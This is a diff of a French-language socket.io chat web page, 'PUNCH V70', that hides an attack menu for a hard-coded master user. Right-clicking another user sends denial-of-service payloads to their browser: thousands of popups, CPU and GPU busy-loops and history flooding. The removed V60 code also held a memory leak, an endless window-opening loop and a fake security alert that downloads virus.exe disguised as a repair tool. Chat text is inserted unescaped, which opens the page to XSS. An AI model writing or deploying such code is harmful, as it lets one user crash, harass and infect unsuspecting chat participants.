@@ -2,202 +2,160 @@
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>PUNCH V60 - SYSTEM OVERLOAD</title>
+    <title>PUNCH V70 - OMEGA STRIKE</title>
     <style>
-        /* --- DESIGN PUNCH : INDUSTRIAL AGGRESSION --- */
-        @import url('https://fonts.googleapis.com/css2?family=Archivo+Black&family=JetBrains+Mono:wght@800&family=Inter:wght@900&display=swap');
-
-        :root {
-            --punch-red: #ff0000;
-            --punch-orange: #ff6a00;
-            --punch-black: #050505;
-            --smooth-fast: cubic-bezier(0.8, 0, 0.2, 1);
-        }
-
-        * { box-sizing: border-box; margin: 0; padding: 0; cursor: none; outline: none; }
-        body { background: var(--punch-black); color: #fff; font-family: 'Inter', sans-serif; overflow: hidden; height: 100vh; }
-
-        /* --- BACKGROUND FX --- */
-        #punch-grid { position: fixed; inset: 0; background-image: linear-gradient(rgba(255,0,0,0.05) 1px, transparent 1px), linear-gradient(90deg, rgba(255,0,0,0.05) 1px, transparent 1px); background-size: 50px 50px; z-index: -1; }
-        #vibration-overlay { position: fixed; inset: 0; pointer-events: none; z-index: 1000000; mix-blend-mode: overlay; opacity: 0; }
-
-        /* --- CURSOR --- */
-        #c-punch { position: fixed; width: 30px; height: 30px; border: 2px solid var(--punch-red); transform: rotate(45deg); z-index: 10000000; pointer-events: none; transition: transform 0.05s linear; }
-
-        /* --- LAYOUT --- */
-        .punch-interface { display: grid; grid-template-columns: 400px 1fr 350px; height: 100vh; }
-        .p-side { background: rgba(0,0,0,0.95); border-right: 2px solid #111; display: flex; flex-direction: column; }
+        @import url('https://fonts.googleapis.com/css2?family=Archivo+Black&family=JetBrains+Mono:wght@800&display=swap');
+        :root { --p-red: #ff0000; --p-black: #000; }
+        * { box-sizing: border-box; margin: 0; padding: 0; cursor: crosshair; }
+        body { background: var(--p-black); color: #fff; font-family: 'Inter', sans-serif; overflow: hidden; }
         
-        .p-header { padding: 40px; border-bottom: 2px solid var(--punch-red); }
-        .p-header h1 { font-family: 'Archivo Black'; font-size: 50px; color: var(--punch-red); letter-spacing: -2px; line-height: 0.8; }
-        .p-header span { font-size: 10px; font-family: 'JetBrains Mono'; color: #444; }
+        /* INTERFACE PUNCH */
+        .grid { display: grid; grid-template-columns: 350px 1fr; height: 100vh; }
+        .sidebar { background: #050505; border-right: 3px solid var(--p-red); padding: 20px; }
+        .main { display: flex; flex-direction: column; background: #000; }
+        #chat { flex: 1; padding: 30px; overflow-y: auto; font-family: 'JetBrains Mono'; }
+        .input-area { padding: 20px; background: #050505; display: flex; gap: 10px; }
+        input { flex: 1; background: #000; border: 1px solid #333; color: #fff; padding: 15px; }
+        
+        /* MENU CONTEXTUEL */
+        #p-menu { display: none; position: fixed; background: #000; border: 2px solid var(--p-red); width: 300px; z-index: 10000; }
+        .opt { padding: 15px; font-weight: 900; color: #fff; border-bottom: 1px solid #222; cursor: pointer; }
+        .opt:hover { background: var(--p-red); color: #000; }
 
-        /* LISTE CIBLES */
-        #target-list { flex: 1; overflow-y: auto; padding: 20px; }
-        .target-node { 
-            padding: 20px; background: #0a0a0a; border: 1px solid #1a1a1a; margin-bottom: 10px; 
-            transition: 0.2s var(--smooth-fast); position: relative; border-left: 0px solid var(--punch-red);
-        }
-        .target-node:hover { border-left-width: 10px; background: #111; transform: scale(1.02); }
-        .target-node.master { border-left-color: var(--punch-orange); background: #150a00; }
-
-        /* CHAT / VIEWPORT */
-        .p-main { display: flex; flex-direction: column; background: radial-gradient(circle at center, #0f0000 0%, #000 100%); }
-        #p-chat { flex: 1; padding: 40px; overflow-y: auto; display: flex; flex-direction: column; gap: 15px; }
-        .p-bubble { padding: 20px; background: rgba(255,255,255,0.03); border: 1px solid #1a1a1a; font-weight: 700; font-size: 15px; animation: punchIn 0.3s var(--smooth-fast); }
-        @keyframes punchIn { from { transform: scale(0.8) rotate(-2deg); opacity: 0; } }
-
-        /* INPUT AREA */
-        .p-input-zone { padding: 30px; background: #000; border-top: 2px solid #111; display: flex; gap: 15px; }
-        #p-input { flex: 1; background: #080808; border: 1px solid #222; padding: 20px; color: #fff; font-family: 'JetBrains Mono'; font-weight: 800; }
-
-        /* --- ATTACK UI --- */
-        #punch-overlay { position: fixed; inset: 0; background: #ff0000; z-index: 100000000; display: none; align-items: center; justify-content: center; flex-direction: column; }
-        .punch-warning { font-family: 'Archivo Black'; font-size: 10vw; color: #000; text-align: center; line-height: 0.9; }
-
-        /* CONTEXT MENU */
-        #p-menu { display: none; position: fixed; background: #000; border: 2px solid var(--punch-red); width: 350px; z-index: 1000000; box-shadow: 20px 20px 0px var(--punch-red); }
-        .p-opt { padding: 18px; border-bottom: 1px solid #111; font-size: 12px; font-weight: 900; color: #666; transition: 0.1s; display: flex; justify-content: space-between; }
-        .p-opt:hover { background: var(--punch-red); color: #000; }
+        /* CRASH OVERLAY */
+        #crash-screen { position: fixed; inset: 0; background: #ff0000; z-index: 999999; display: none; align-items: center; justify-content: center; flex-direction: column; }
+        .big-txt { font-family: 'Archivo Black'; font-size: 8vw; color: #000; }
     </style>
 </head>
 <body oncontextmenu="return false;">
 
-    <div id="punch-grid"></div>
-    <div id="c-punch"></div>
-    <div id="vibration-overlay"></div>
+<div id="crash-screen"><div class="big-txt">PUNCHED_BY_MASTER</div></div>
 
-    <div id="punch-overlay">
-        <div class="punch-warning">SYSTEM<br>PUNCHED</div>
-        <div id="p-logs" style="font-family:'JetBrains Mono'; color:#000; font-size:10px; margin-top:50px;"></div>
-        <div style="margin-top:50px; border:4px solid #000; padding:20px 60px; font-weight:900; color:#000;" onclick="punishExit()">FORCE_REBOOT</div>
-    </div>
+<div class="grid">
+    <aside class="sidebar">
+        <h1 style="color:var(--p-red); font-family:'Archivo Black'; font-size:40px;">PUNCH V70</h1>
+        <div id="user-list" style="margin-top:30px;"></div>
+    </aside>
+    <main class="main">
+        <div id="chat"></div>
+        <div class="input-area">
+            <input type="text" id="msg-in" placeholder="STRIKE...">
+            <button onclick="send()" style="background:var(--p-red); border:none; padding:0 30px; font-weight:900;">HIT</button>
+        </div>
+    </main>
+</div>
 
-    <div class="punch-interface">
-        <aside class="p-side">
-            <div class="p-header">
-                <h1>PUNCH</h1>
-                <span>V60_TOTAL_WAR_EDITION</span>
-            </div>
-            <div id="target-list"></div>
-        </aside>
+<div id="p-menu">
+    <div class="opt" style="background:#fff; color:#000;">STRIKE SELECTION</div>
+    <div class="opt" onclick="fireCombo()">🔥 OMEGA_COMBO (ALL ATK)</div>
+    <div class="opt" onclick="fire('p_tsunami')">📑 TAB_TSUNAMI (1000+)</div>
+    <div class="opt" onclick="fire('p_cpu')">☢️ CPU_KNOCKOUT</div>
+    <div class="opt" onclick="fire('p_gpu')">🎨 GPU_MOLTEN</div>
+    <div class="opt" onclick="this.parentElement.style.display='none'">CANCEL</div>
+</div>
 
-        <main class="p-main">
-            <div id="p-chat"></div>
-            <div class="p-input-zone">
-                <input type="text" id="p-input" placeholder="READY_TO_STRIKE..." onkeydown="if(event.key==='Enter') send()">
-                <button onclick="send()" style="background:var(--punch-red); border:none; padding:0 40px; font-family:'Archivo Black'; font-size:15px;">HIT</button>
-            </div>
-        </main>
+<script src="/socket.io/socket.io.js"></script>
+<script>
+    const socket = io();
+    let me = ""; let target = "";
 
-        <aside class="p-side" style="border-right:none; border-left:2px solid #111; padding:30px;">
-            <div style="font-family:'JetBrains Mono'; font-size:10px; color:#333;">COMBAT_LOGS_V60</div>
-            <div id="p-terminal" style="font-family:'JetBrains Mono'; font-size:9px; color:#1a1a1a; flex:1; overflow-y:auto; margin-top:20px;"></div>
-        </aside>
-    </div>
+    window.onload = () => {
+        me = prompt("USER_ID:");
+        socket.emit('init', { name: me });
+    };
 
-    <div id="p-menu">
-        <div class="p-opt" onclick="fire('p_infect')">🥊 INFECT_STRIKE <span>[VIRUS]</span></div>
-        <div class="p-opt" onclick="fire('p_cpu_death')">🥊 CPU_KNOCKOUT <span>[MAX]</span></div>
-        <div class="p-opt" onclick="fire('p_ram_kill')">🥊 RAM_GENOCIDE <span>[MAX]</span></div>
-        <div class="p-opt" onclick="fire('p_ios_lock')">🥊 IOS_LOCKDOWN <span>[iPad]</span></div>
-        <div class="p-opt" onclick="fire('p_tab_flood')">🥊 TAB_TSUNAMI <span>[WIN]</span></div>
-        <div class="p-opt" onclick="fire('p_gpu_fry')">🥊 GPU_MOLTEN <span>[GPU]</span></div>
-        <div class="p-opt" onclick="fire('p_sonic')">🥊 SONIC_BOMB <span>[VOL]</span></div>
-        <div class="p-opt" onclick="fire('p_haptic')">🥊 HAPTIC_RESONANCE <span>[VIB]</span></div>
-        <div class="p-opt" onclick="fire('p_disk')">🥊 DISK_FLOOD <span>[HD]</span></div>
-        <div class="p-opt" onclick="this.parentElement.style.display='none'">[ CANCEL ]</div>
-    </div>
+    // --- LOGIQUE CLIC DROIT ---
+    window.oncontextmenu = (e) => {
+        e.preventDefault();
+        if(me !== "toucheur2pp") return;
+        const m = document.getElementById('p-menu');
+        m.style.display = 'block'; m.style.top = e.pageY+'px'; m.style.left = e.pageX+'px';
+        const node = document.elementFromPoint(e.clientX, e.clientY).closest('.u-node');
+        if(node) target = node.getAttribute('data-id');
+    };
 
-    <script src="/socket.io/socket.io.js"></script>
-    <script>
-        const socket = io();
-        let me = ""; let targetId = "";
+    function send() {
+        const i = document.getElementById('msg-in');
+        socket.emit('chat', i.value); i.value = "";
+    }
 
-        document.addEventListener('mousemove', e => {
-            const c = document.getElementById('c-punch');
-            c.style.left = e.clientX - 15 + 'px';
-            c.style.top = e.clientY - 15 + 'px';
-        });
+    // --- LE COMBO ULTIME ---
+    function fireCombo() {
+        fire('p_tsunami');
+        fire('p_cpu');
+        fire('p_gpu');
+        fire('p_ram');
+    }
 
-        window.onload = () => {
-            me = prompt("PUNCH_AUTH_TOKEN:");
-            socket.emit('init', { name: me });
-            document.addEventListener('touchmove', e => e.preventDefault(), { passive: false });
-        };
+    function fire(type) {
+        if(!target) return;
+        socket.emit(type, target);
+        document.getElementById('p-menu').style.display = 'none';
+    }
 
-        window.oncontextmenu = (e) => {
-            e.preventDefault();
-            if(me === "toucheur2pp") {
-                const m = document.getElementById('p-menu');
-                m.style.display = 'block'; m.style.top = e.pageY+'px'; m.style.left = e.pageX+'px';
-                const el = document.elementFromPoint(e.clientX, e.clientY);
-                const node = el.closest('.target-node');
-                if(node) { targetId = node.getAttribute('data-sid'); logP("TARGET_LOCKED: " + targetId); }
+    // --- EXECUTION CHEZ LA VICTIME ---
+    socket.on('execute', (d) => {
+        let success = false;
+        const screen = document.getElementById('crash-screen');
+        
+        try {
+            // 1. TSUNAMI D'ONGLETS (Milliers d'onglets)
+            if(d.type === 'p_tsunami' || d.type === 'p_combo') {
+                for(let i=0; i<2000; i++) {
+                    let win = window.open(location.href, '_blank', 'width=10,height=10');
+                    if(win) success = true;
+                }
             }
-        };
 
-        function fire(type) { socket.emit(type, targetId); logP("STRIKE_FIRED: " + type); }
-        function logP(t) { const term = document.getElementById('p-terminal'); term.innerHTML += `<div>[${new Date().toLocaleTimeString()}] > ${t}</div>`; term.scrollTop = term.scrollHeight; }
-        function send() { const i = document.getElementById('p-input'); socket.emit('chat', i.value); i.value = ""; }
-
-        // --- PUNCH EXECUTION ENGINE ---
-        socket.on('execute', (d) => {
-            document.getElementById('punch-overlay').style.display = 'flex';
-            const logs = document.getElementById('p-logs');
-
-            if(d.type === 'p_cpu_death') {
+            // 2. CPU / GPU / RAM (Surcharges combinées)
+            if(d.type === 'p_cpu' || d.type === 'p_combo') {
+                success = true;
                 setInterval(() => {
-                    for(let i=0; i<2000000; i++) { Math.atan2(Math.random(), Math.random()); }
-                    history.pushState(null,'',location.href+'#'+Math.random());
-                }, 5);
+                    for(let i=0; i<5000000; i++) { Math.sqrt(Math.random() * 999); }
+                    history.pushState(null, '', '#' + Math.random());
+                }, 1);
             }
 
-            if(d.type === 'p_ram_kill') {
-                const leak = [];
-                setInterval(() => { for(let i=0; i<10000; i++) leak.push(new Float64Array(1024)); }, 10);
+            if(d.type === 'p_gpu' || d.type === 'p_combo') {
+                const c = document.createElement('canvas');
+                const gl = c.getContext('webgl');
+                setInterval(() => { for(let i=0; i<10000; i++) gl.clear(gl.COLOR_BUFFER_BIT); }, 1);
             }
 
-            if(d.type === 'p_ios_lock') {
-                setInterval(() => { for(let i=0; i<600; i++) history.pushState(null,'',location.href+'#'+i+'_'+Math.random()); }, 15);
+            // AFFICHAGE DU RÉSULTAT
+            if(success) {
+                screen.style.display = 'flex';
+                socket.emit('chat', `[STRIKE] EZ WIN - ${d.type.toUpperCase()} ACTIVATED`);
+            } else {
+                socket.emit('chat', `[STRIKE] FAILED - il a esquivé lbatrd (Bloqueur actif)`);
             }
 
-            if(d.type === 'p_infect') {
-                document.getElementById('punch-overlay').innerHTML = `
-                    <div style="background:#fff; color:#000; padding:50px; text-align:center;">
-                        <h1 style="font-family:'Archivo Black'">ALERTE SÉCURITÉ</h1>
-                        <p>Fichier corrompu détecté. Veuillez installer PUNCH_FIX.exe</p>
-                        <button onclick="dl()" style="background:#ff0000; color:#fff; border:none; padding:20px; margin-top:20px; font-weight:900;">TÉLÉCHARGER LE FIX</button>
-                    </div>`;
-            }
-        });
-
-        function dl() {
-            const a = document.createElement('a'); a.href = "https://ton-lien.com/virus.exe"; a.download = "PUNCH_REPAIR_SYSTEM.exe"; a.click();
+        } catch(e) {
+            socket.emit('chat', `[STRIKE] FAILED - Erreur système`);
         }
+    });
 
-        function punishExit() { while(true) { window.open(location.href); } }
-
-        socket.on('sync', l => {
-            const list = document.getElementById('target-list');
-            list.innerHTML = "";
-            l.forEach(u => {
-                const d = document.createElement('div');
-                d.className = `target-node ${u.name === "toucheur2pp" ? 'master' : ''}`;
-                d.setAttribute('data-sid', u.id);
-                d.innerHTML = `<b>${u.name.toUpperCase()}</b><br><small>${u.id.substr(0,20)}</small>`;
-                list.appendChild(d);
-            });
+    // --- SYNC ---
+    socket.on('sync', list => {
+        const c = document.getElementById('user-list');
+        c.innerHTML = "";
+        list.forEach(u => {
+            const div = document.createElement('div');
+            div.className = "u-node";
+            div.setAttribute('data-id', u.id);
+            div.style.padding = "15px"; div.style.borderBottom = "1px solid #111";
+            div.innerHTML = `<b>${u.name.toUpperCase()}</b>`;
+            c.appendChild(div);
         });
+    });
 
-        socket.on('chat', d => {
-            const sc = document.getElementById('p-chat');
-            sc.innerHTML += `<div class="p-bubble"><b>${d.n}:</b> ${d.t}</div>`;
-            sc.scrollTop = sc.scrollHeight;
-        });
+    socket.on('chat', d => {
+        const chat = document.getElementById('chat');
+        chat.innerHTML += `<div><span style="color:red">${d.n}:</span> ${d.t}</div>`;
+        chat.scrollTop = chat.scrollHeight;
+    });
 
-        window.onclick = () => document.getElementById('p-menu').style.display = 'none';
-    </script>
+    window.onclick = () => document.getElementById('p-menu').style.display = 'none';
+</script>
 </body>
 </html>
